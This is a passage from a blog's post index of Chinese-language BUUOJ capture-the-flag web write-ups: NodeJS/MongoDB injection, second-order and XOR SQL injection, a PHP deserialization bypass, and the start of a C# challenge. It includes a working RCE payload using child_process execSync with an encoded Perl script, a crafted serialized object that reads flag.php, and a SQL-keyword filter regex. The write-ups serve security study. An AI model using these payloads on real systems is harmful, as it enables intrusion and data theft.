class=\"built_in\">this</span>.__id = <span class=\"built_in\">this</span>.toString(<span class=\"string\">&#x27;hex&#x27;</span>);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure> 如果id!=null并且id.length===12则this.id=id，但我们不能走这个判断，因为最后一行会把我们的Payload转成Hex。那么Payload变为<code>id=&#123;\"length\":\"0\",\"id\":&#123;\"length\":12&#125;&#125;</code>，下一个if要求id.toHexString为真，那么Payload变为：<code>id=&#123;\"length\":\"0\",\"toHexString\":true,\"id\":&#123;\"length\":12&#125;&#125;</code>。这样就可以绕过检测了。</p>\r\n<p>我们可控id了，下一步是要控制报错信息。我们的Hint目前还没用上，后端数据库用的是MongoDB。在MongoDB里执行一下Hint试试。</p>\r\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">MongoDB shell version: 2.6.10</span><br><span class=\"line\">connecting to: test</span><br><span class=\"line\">&gt; db.a.find(&#123;&quot;b&quot;:&#123;&quot;$gt&quot;:1,&quot;c&quot;:&quot;d&quot;&#125;&#125;)</span><br><span class=\"line\">error: &#123;</span><br><span class=\"line\">\t&quot;$err&quot; : &quot;Can&#39;t canonicalize query: BadValue unknown operator: c&quot;,</span><br><span class=\"line\">\t&quot;code&quot; : 17287</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>$gt在MongoDB是&gt;的意思，是个内置运算符。如果内置运算符放在最前面，后面的内容就会报错，key会显示出来。下面就是传NodeJS的Payload了，用require('child_process').execSync即可。然后有个问题，又来/readflag绕过，用Perl的IPC:Open3来进行管道交互，最终拿到flag。</p>\r\n<p>最终Payload:Client.getPlayerID =  () => ({ \"$gt\":1,[`process.chdir('/');socket.emit('aaa');socket.emit(require('child_process').execSync('sh -c \\\"echo \\\\\\'dXNlIHN0cmljdDsKdXNlIElQQzo6T3BlbjM7CgpteSAkcGlkID0gb3BlbjMoXCpDSExEX0lOLCBcKkNITERfT1VULCBcKkNITERfRVJSLCAnL3JlYWRmbGFnJykgb3IgZGllICJvcGVuMygpIGZhaWxlZCAkISI7CgpteSAkcjsKCiRyID0gPENITERfT1VUPjsKcHJpbnQgIiRyIjsKJHIgPSA8Q0hMRF9PVVQ+OwpwcmludCAiJHIiOwokcj1ldmFsICIkciI7CnByaW50ICIkclxuIjsKcHJpbnQgQ0hMRF9JTiAiJHJcbiI7CiRyID0gPENITERfT1VUPjsKcHJpbnQgIiRyIjsKJHIgPSA8Q0hMRF9PVVQ+OwpwcmludCAiJHIiOw==\\\\\\'|base64 -d | perl \\\"'));`]:\"bb\", toHexString: 'aaa', length: 0, id: {length: 12}})</p>\r\n<p>为了方便Payload输入 我们用Base64编码然后传递Perl，没用bash的原因是bash并不是总是存在的，但是sh一定有（说的就是你，Alpine Linux）。</p>\r\n<p>放在控制台里执行，然后点Play触发，就可以在Network的WS里看到结果了。如图所示：</p>\r\n<img src=\"/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/Final-Payload-1.png\" class=\"\" title=\"Final Payload 1\">\r\n<img src=\"/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/Final-Payload-2.png\" class=\"\" title=\"Final Payload 2\">\r\n<p>P.S. 网上的Payload都没注意引号的转义啊，在控制台里输入Payload的时候要进行单双引号转义，但是传递到NodeJS后原本转义用的<code>\\</code>会被去掉，就变成没转义的，实际上要二次转义。</p>\r\n\n    <div id=\"aplayer-RcZsWiQj\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"27570832\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{ef5059f5-8ee6-4727-aca3-6bd720379070}</p>\r\n","categories":["Writeups"],"tags":["Web","NodeJS","BUUOJ","Pipe"]},{"title":"BUUOJ刷题-Web-BabyBlog","url":"/2019/10/29/BUUOJ%E5%88%B7%E9%A2%98-Web-BabyBlog/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>ByteCTF 2019的BabyBlog。</p>\r\n<p>扫目录发现有www.zip，那就看源码吧。</p>\r\n<p>config.php里有个SafeFilter()。 <a id=\"more\"></a> <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SafeFilter</span>(<span class=\"params\">&amp;$arr</span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> ($arr <span class=\"keyword\">as</span> $key =&gt; $value) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!is_array($value)) &#123;</span><br><span class=\"line\">            $filter = <span class=\"string\">&quot;benchmark\\s*?\\(.*\\)|sleep\\s*?\\(.*\\)|load_file\\s*?\\\\(|\\\\b(and|or)\\\\b\\\\s*?([\\\\(\\\\)&#x27;\\&quot;\\\\d]+?=[\\\\(\\\\)&#x27;\\&quot;\\\\d]+?|[\\\\(\\\\)&#x27;\\&quot;a-zA-Z]+?=[\\\\(\\\\)&#x27;\\&quot;a-zA-Z]+?|&gt;|&lt;|\\s+?[\\\\w]+?\\\\s+?\\\\bin\\\\b\\\\s*?\\(|\\\\blike\\\\b\\\\s+?[\\&quot;&#x27;])|\\\\/\\\\*.*\\\\*\\\\/|&lt;\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT\\s*(\\(.+\\)\\s*|@&#123;1,2&#125;.+?\\s*|\\s+?.+?|(`|&#x27;|\\&quot;).*?(`|&#x27;|\\&quot;)\\s*)|UPDATE\\s*(\\(.+\\)\\s*|@&#123;1,2&#125;.+?\\s*|\\s+?.+?|(`|&#x27;|\\&quot;).*?(`|&#x27;|\\&quot;)\\s*)SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE)@&#123;0,2&#125;(\\\\(.+\\\\)|\\\\s+?.+?\\\\s+?|(`|&#x27;|\\&quot;).*?(`|&#x27;|\\&quot;)|(\\+|-|~|!|@:=|&quot;</span> . urldecode(<span class=\"string\">&#x27;%0B&#x27;</span>) . <span class=\"string\">&quot;).+?)FROM(\\\\(.+\\\\)|\\\\s+?.+?|(`|&#x27;|\\&quot;).*?(`|&#x27;|\\&quot;))|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (preg_match(<span class=\"string\">&#x27;/&#x27;</span> . $filter . <span class=\"string\">&#x27;/is&#x27;</span>, $value)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;&lt;script&gt;alert(&#x27;Failure!Do not use sensitive words.&#x27;);location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            SafeFilter($arr[$key]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\r\n<p>Ban了一大堆SQL注入用的关键字。然后就是writing.php负责添加文章，edit.php负责编辑文章。然后在edit.php里有几行：</p>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">&#x27;title&#x27;</span>]) &amp;&amp; <span class=\"keyword\">isset</span>($_POST[<span class=\"string\">&#x27;content&#x27;</span>]) &amp;&amp; <span class=\"keyword\">isset</span>($_POST[<span class=\"string\">&#x27;id&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> ($sql-&gt;query(<span class=\"string\">&quot;select * from article where id=&quot;</span> . intval($_POST[<span class=\"string\">&#x27;id&#x27;</span>]) . <span class=\"string\">&quot;;&quot;</span>) <span class=\"keyword\">as</span> $v) &#123;</span><br><span class=\"line\">        $row = $v;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($_SESSION[<span class=\"string\">&#x27;id&#x27;</span>] == $row[<span class=\"string\">&#x27;userid&#x27;</span>]) &#123;</span><br><span class=\"line\">        $title = addslashes($_POST[<span class=\"string\">&#x27;title&#x27;</span>]);</span><br><span class=\"line\">        $content = addslashes($_POST[<span class=\"string\">&#x27;content&#x27;</span>]);</span><br><span class=\"line\">        $sql-&gt;query(<span class=\"string\">&quot;update article set title=&#x27;$title&#x27;,content=&#x27;$content&#x27; where title=&#x27;&quot;</span> . $row[<span class=\"string\">&#x27;title&#x27;</span>] . <span class=\"string\">&quot;&#x27;;&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;&lt;script&gt;alert(&#x27;Edited successfully.&#x27;);location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class=\"line\">    &#125; </span><br></pre></td></tr></table></figure>\r\n<p>update article的title直接用的<span class=\"math inline\">\\(row[&#39;title&#39;]，而\\)</span>row是通过SQL查询赋的值，这里可能造成二次注入，但是目前还不知道有什么用。replace.php貌似也是修改的页面，不过加了个VIP条件限制，以及有一行很有趣的东西：</p>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ($_SESSION[<span class=\"string\">&#x27;id&#x27;</span>] == $row[<span class=\"string\">&#x27;userid&#x27;</span>]) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">&#x27;regex&#x27;</span>]) &amp;&amp; $_POST[<span class=\"string\">&#x27;regex&#x27;</span>] == <span class=\"string\">&#x27;1&#x27;</span>) &#123;</span><br><span class=\"line\">                $content = addslashes(preg_replace(<span class=\"string\">&quot;/&quot;</span> . $_POST[<span class=\"string\">&#x27;find&#x27;</span>] . <span class=\"string\">&quot;/&quot;</span>, $_POST[<span class=\"string\">&#x27;replace&#x27;</span>], $row[<span class=\"string\">&#x27;content&#x27;</span>]));</span><br><span class=\"line\">                $sql-&gt;query(<span class=\"string\">&quot;update article set content=&#x27;$content&#x27; where id=&quot;</span> . $row[<span class=\"string\">&#x27;id&#x27;</span>] . <span class=\"string\">&quot;;&quot;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;&lt;script&gt;alert(&#x27;Replaced successfully.&#x27;);location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;</span>);</span><br></pre></td></tr></table></figure>\r\n<p>preg_replace？并且pattern我们可控，如果传个/e就RCE了。我们目标先定这里，要拿到VIP。register.php里表明了如何成为vip。</p>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($row[<span class=\"string\">&#x27;id&#x27;</span>])) &#123;</span><br><span class=\"line\">                    $password = md5($_POST[<span class=\"string\">&#x27;password&#x27;</span>]);</span><br><span class=\"line\">                    $sql-&gt;query(<span class=\"string\">&quot;insert into users (username,password,isvip) values (&#x27;$username&#x27;, &#x27;$password&#x27;,0);&quot;</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">foreach</span> ($sql-&gt;query(<span class=\"string\">&quot;select id from users where username=&#x27;$username&#x27;;&quot;</span>) <span class=\"keyword\">as</span> $v) &#123;</span><br><span class=\"line\">                        $row = $v;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    $sql-&gt;query(<span class=\"string\">&quot;insert into article (userid,title,content) values (&quot;</span> . $row[<span class=\"string\">&#x27;id&#x27;</span>] . <span class=\"string\">&quot;, &#x27;Hello, world!&#x27;,&#x27;Welcome to babyblog. This is your first post. Edit or delete it, then start blogging!&#x27;);&quot;</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;&lt;script&gt;alert(&#x27;Register successful.&#x27;);location.href=&#x27;login.php&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class=\"line\">                &#125;</span><br></pre></td></tr></table></figure>\r\n<p>看来，我们需要通过那个二次注入来得到拥有isvip权限的用户，因为update语句的表已经定下，是没法修改的，只能查询（可以用堆叠注入）。因此攻击流程如下： <div class=\"mermaid\">\ngraph TD\n\nA[&quot;writing.php写一篇Title包含我们恶意Payload的文章&quot;] --&gt; B\nB[&quot;edit.php修改刚才的文章，修改content，导致恶意Payload直接带入update，完成注入&quot;] --&gt; C\nC[&quot;注入成功时content会改变，否则就不变&quot;]\n\n</div></p>\r\n<p>我们的$row['title']被放在where子句里，因此利用MySQL的特性：</p>\r\n<img src=\"/2019/10/29/BUUOJ%E5%88%B7%E9%A2%98-Web-BabyBlog/where_1.png\" class=\"\" title=\"where_1\">\r\n<img src=\"/2019/10/29/BUUOJ%E5%88%B7%E9%A2%98-Web-BabyBlog/where_0.png\" class=\"\" title=\"where_0\">\r\n<p>然后返回看SafeFilter，过滤了一堆关键字，但是ascii substr啥的都还留着，以及<code>^</code>，就可以用异或注入了，具体请参考<a href=\"https://www.jianshu.com/p/27df5c67157c\">这里</a>，简单来说就是and or的替代，条件间的真假进行异或运算。举例如下：</p>\r\n<img src=\"/2019/10/29/BUUOJ%E5%88%B7%E9%A2%98-Web-BabyBlog/xor.png\" class=\"\" title=\"xor\">\r\n<p>最后还有一个问题，edit.php里我们的title和content是经过addslashes()处理的，怎么绕？注意，我们的$row['title']是通过SQL查询来的，我们通过addslashes()处理后会在<code>'</code>后加<code>\\</code>，但是写入数据库的时候，转义又被写回去了，再次查询的时候还是<code>1'</code>，addslashes()形同虚设。</p>\r\n<p>那么我们可以开始写脚本了。（我不是很喜欢在盲注里用二分法，为什么不多给服务器添点流量呢？ ~(≧▽≦)/~）</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\r\n\n    <div id=\"aplayer-mKWTnQEU\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"20744782\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{55686b5f-27d2-41f6-87c4-7decc588cf7f}</p>\r\n","categories":["Writeups"],"tags":["PHP","Web","BUUOJ","SQL注入","二次注入","异或注入","盲注"]},{"title":"BUUOJ刷题-Web-AreUSerialz","url":"/2020/05/14/BUUOJ%E5%88%B7%E9%A2%98-Web-AreUSerialz/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>2020网鼎杯青龙组的AreUSerialz。</p>\r\n<p>上来给源码： <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&quot;flag.php&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FileHandler</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> $op;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> $filename;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> $content;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        $op = <span class=\"string\">&quot;1&quot;</span>;</span><br><span class=\"line\">        $filename = <span class=\"string\">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class=\"line\">        $content = <span class=\"string\">&quot;Hello World!&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;process();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">process</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;op == <span class=\"string\">&quot;1&quot;</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;write();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;op == <span class=\"string\">&quot;2&quot;</span>) &#123;</span><br><span class=\"line\">            $res = <span class=\"keyword\">$this</span>-&gt;read();</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;output($res);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;output(<span class=\"string\">&quot;Bad Hacker!&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">write</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;filename) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;content)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(strlen((<span class=\"keyword\">string</span>)<span class=\"keyword\">$this</span>-&gt;content) &gt; <span class=\"number\">100</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">$this</span>-&gt;output(<span class=\"string\">&quot;Too long!&quot;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">die</span>();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            $res = file_put_contents(<span class=\"keyword\">$this</span>-&gt;filename, <span class=\"keyword\">$this</span>-&gt;content);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>($res) <span class=\"keyword\">$this</span>-&gt;output(<span class=\"string\">&quot;Successful!&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">else</span> <span class=\"keyword\">$this</span>-&gt;output(<span class=\"string\">&quot;Failed!&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;output(<span class=\"string\">&quot;Failed!&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">read</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        $res = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;filename)) &#123;</span><br><span class=\"line\">            $res = file_get_contents(<span class=\"keyword\">$this</span>-&gt;filename);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $res;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">output</span>(<span class=\"params\">$s</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $s;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;op === <span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;op = <span class=\"string\">&quot;1&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;content = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;process();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">is_valid</span>(<span class=\"params\">$s</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>($i = <span class=\"number\">0</span>; $i &lt; strlen($s); $i++)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!(ord($s[$i]) &gt;= <span class=\"number\">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class=\"number\">125</span>))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET&#123;<span class=\"string\">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    $str = (<span class=\"keyword\">string</span>)$_GET[<span class=\"string\">&#x27;str&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(is_valid($str)) &#123;</span><br><span class=\"line\">        $obj = unserialize($str);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure> 很简单，给了个FileHandler类，然后GET方式传序列化字符串。注意到返回的HTTP头里X-Powered-By为PHP/7.4.3，版本很高。</p>\r\n<p>FileHandler类里有三个protected变量，<span class=\"math inline\">\\(op决定是读还是写，为1则写文件，2则读文件并输出。但是有个\\_\\_destruct，会把\\)</span>op改为1。那么我们就要想办法绕过__destruct函数。同时，在$_GET传参的时候还有一个is_valid函数，判断传入的字符串是不是都在可见字符范围内。</p>\r\n<p>我们翻PHP的<a href=\"https://www.php.net/manual/en/function.serialize.php\">文档</a>，其中提到如果类中变量为private protected属性，会在序列化字符串中添加特殊标识。因此正常序列化的字符串会被is_valid()检测。</p>\r\n<p>后来在<a href=\"%5Bhttps://iambigboss.top/post/59655_1_1.html#%E5%86%99%E5%9C%A8%E8%BF%99%E9%A2%98%E7%9A%84%E6%9C%80%E5%90%8E%5D(https://iambigboss.top/post/59655_1_1.html#写在这题的最后)\">某篇文章</a>中看到，PHP7.2以上版本反序列化时无视private protected关键字。那么我们直接用public声明变量就行了。</p>\r\n<p>或者，我们可以用S代替s，参考<a href=\"https://github.com/ambionics/phpggc\">这里</a>，其中提到为了防止丢失%00字符。我们可以在反序列化字符串中用S插入16进制字符串。正常情况下我们的序列化字符串应为：O:11:\"FileHandler\":3:{s:5:\"�*�op\";i:2;s:11:\"�*�filename\";s:8:\"flag.php\";s:10:\"�*�content\";N;}。其中�为%00。我们可以改写为O:11:\"FileHandler\":3:{S:5:\"\\00*\\00op\";i:2;S:11:\"\\00*\\00filename\";s:8:\"flag.php\";S:10:\"\\00*\\00content\";N;}。这样也可以绕过is_valid()。</p>\r\n<p>最后，这题在BUUOJ上的环境和比赛 环境不一样。BUUOJ上我们可以直接读相对路径下的flag.php。但是比赛环境下我们还需要读/proc/self/cmdline，确认工作目录。</p>\r\n<p>P.S.如果反序列化后类的元素个数与原始类的个数对不上，就会打断执行__destruct()，就像绕过__wakeup()一样。</p>\r\n\n    <div id=\"aplayer-nKcPhdxq\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"786569\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{8eba897c-a688-444f-b0e0-63e9cab136ce}</p>\r\n","categories":["Writeups"],"tags":["Unserialize","PHP"]},{"title":"BUUOJ刷题-Web-Buggy-Net","url":"/2019/12/07/BUUOJ%E5%88%B7%E9%A2%98-Web-Buggy-Net/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>HITCON 2019的Buggy_Net，少见的C#题啊。<span class=\"github-emoji\" alias=\"orange\" style=\"\" fallback-src=\"https://github.githubassets.com/images/icons/emoji/unicode/1f34a.png?v8\">&#x1f34a;</span>大大的题。</p>\r\n<p>先说一下，flag在C:\\FLAG.txt里。</p>\r\n<p>给了源码： <a id=\"more\"></a> <figure class=\"highlight cs\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;%@ Page Language=<span class=\"string\">&quot;C#&quot;</span> %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang=<span class=\"string\">&quot;en&quot;</span>&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=<span class=\"string\">&quot;utf-8&quot;</span>/&gt;</span><br><span class=\"line\">    &lt;link rel=<span class=\"string\">&quot;stylesheet&quot;</span> type=<span class=\"string\">&quot;text/css&quot;</span> href=<span class=\"string\">&quot;https://bootswatch.com/4/sketchy/bootstrap.min.css&quot;</span>&gt;</span><br><span class=\"line\">    &lt;style type=<span class=\"string\">&quot;text/css&quot;</span>&gt;</span><br><span class=\"line\">        .form-control-borderless &#123;</span><br><span class=\"line\">            border: none;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        .form-control-borderless:hover, .form-control-borderless:active, .form-control-borderless:focus &#123;</span><br><span class=\"line\">            border: none;</span><br><span class=\"line\">            outline: none;</span><br><span class=\"line\">            box-shadow: none;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &lt;/style&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">    &lt;div <span class=\"keyword\">class</span>=<span class=\"string\">&#x27;container&#x27;</span>&gt;</span><br><span class=\"line\">        &lt;br&gt;</span><br><span class=\"line\">        &lt;br&gt;</span><br><span class=\"line\">        &lt;div <span class=\"keyword\">class</span>=<span class=\"string\">&#x27;row justify-content-center&#x27;</span>&gt;</span><br><span class=\"line\">            &lt;h1&gt;&lt;font style=<span class=\"string\">&quot;font-size: 200%&quot;</span>&gt;Buggy .Net&lt;/font&gt;&lt;/h1&gt;</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;div <span class=\"keyword\">class</span>=<span class=\"string\">&#x27;row justify-content-center&#x27;</span>&gt;</span><br><span class=\"line\">            &lt;i&gt; Here <span class=\"keyword\">is</span> the source <span class=\"keyword\">for</span> you: &lt;a href=<span class=\"string\">&#x27;Default.txt&#x27;</span>&gt;Default.txt&lt;/a&gt;&lt;/i&gt;</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">        &lt;br&gt;</span><br><span class=\"line\">        &lt;div <span class=\"keyword\">class</span>=<span class=\"string\">&#x27;row justify-content-center&#x27;</span>&gt;</span><br><span class=\"line\">            &lt;div <span class=\"keyword\">class</span>=<span class=\"string\">&quot;col-12 col-md-10 col-lg-12&quot;</span>&gt;</span><br><span class=\"line\">                &lt;form <span class=\"keyword\">class</span>=<span class=\"string\">&quot;card card-sm&quot;</span> method=<span class=\"string\">&quot;POST&quot;</span> action=<span class=\"string\">&quot;&quot;</span>&gt;</span><br><span class=\"line\">                    &lt;div <span class=\"keyword\">class</span>=<span class=\"string\">&quot;card-body row no-gutters align-items-center&quot;</span>&gt;</span><br><span class=\"line\">                        &lt;div <span class=\"keyword\">class</span>=<span class=\"string\">&quot;col&quot;</span>&gt;</span><br><span class=\"line\">                            &lt;input <span class=\"keyword\">class</span>=<span class=\"string\">&quot;form-control form-control-lg form-control-borderless&quot;</span> type=<span class=\"string\">&quot;text&quot;</span> name=<span class=\"string\">&quot;filename&quot;</span> placeholder=<span class=\"string\">&quot;filename...&quot;</span>&gt;</span><br><span class=\"line\">                        &lt;/div&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">                        &lt;div <span class=\"keyword\">class</span>=<span class=\"string\">&quot;col-auto&quot;</span>&gt;</span><br><span class=\"line\">                            &lt;button <span class=\"keyword\">class</span>=<span class=\"string\">&quot;btn btn-lg btn-success&quot;</span> type=<span class=\"string\">&quot;submit&quot;</span>&gt;Send&lt;/button&gt;</span><br><span class=\"line\">                        &lt;/div&gt;</span><br><span class=\"line\">                    &lt;/div&gt;</span><br><span class=\"line\">                &lt;/form&gt;</span><br><span class=\"line\">            